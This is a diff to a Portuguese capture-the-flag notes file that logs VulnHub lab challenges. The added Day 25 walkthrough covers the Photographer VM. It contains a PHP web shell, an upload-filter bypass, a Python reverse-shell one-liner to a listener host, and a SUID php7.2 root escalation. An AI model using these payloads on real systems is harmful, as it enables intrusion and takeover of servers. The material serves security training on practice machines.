@@ -24,7 +24,8 @@ Desafio 21 - Solar Winds Serv-U - CVE-2019-12181 | SQLI into dumpfile - https://
 Desafio 22 - Fake GoogleBot | LFI | Misconfiguration | $PATH abuse - https://www.vulnhub.com/entry/inclusiveness-1,422/</br>
 Desafio 23 - RCE sar2HTML | crontab abuse  - https://www.vulnhub.com/entry/sar-1,425/ </br>
 Desafio 24 - PHP LiteAdmin 1.9.3 exploit | sudo tar/zip abuse -  https://www.vulnhub.com/entry/zico2-1,210/</br>
-Desafio 25 - - https://www.vulnhub.com/entry/photographer-1,519/ </br>
+Desafio 25 - Feat V1N1V131R4 | Koken CMS 0.22.24 | Bypass Upload JPG - https://www.vulnhub.com/entry/photographer-1,519/ </br>
+Desafio 26 - - https://www.vulnhub.com/entry/tempus-fugit-1,346/ </br>
 <br/>**--VM--**
 
 <br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
@@ -1158,3 +1159,48 @@ Desafio 25 - - https://www.vulnhub.com/entry/photographer-1,519/ </br>
 		#ZIP
 		touch beco24
 		sudo zip /tmp/beco24.zip /tmp/beco24 -T --unzip-command="sh -c /bin/bash"
+
+
+
+
+<h3>Dia 25 			1/10/2020</h3>
+
+	*scan -A -p- ip
+	
+	*smb
+		smbclient -L //ip_vm
+			users
+		smbclient //ip_vm/sambashare
+			sem senha	
+			
+			get mailsent.txt
+			
+		*browser: ip/8000
+			/admin
+			
+			user: daisa@photographer.com
+			pass: babygirl
+			
+			echo '<?php system($_GET['cmd']);?>' > image.php.jpg
+			import content			
+				*burp
+					image.php.jpg
+						retirar o .jpg
+					
+			content
+				selecione o da data atual
+					download file -> copie o link 
+						exemplo: http://192.168.100.31:8000/storage/originals/9a/96/image.php
+						
+						*http://192.168.100.31:8000/storage/originals/9a/96/image.php?cmd=whereis%20python
+						
+			*nc -lnvp 443
+			http://192.168.100.31:8000/storage/originals/9a/96/image.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+			find / -perm -u=s 2>&-
+				#/usr/bin/php7.2
+				
+				CMD="/bin/sh"
+				/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
+			
+				root
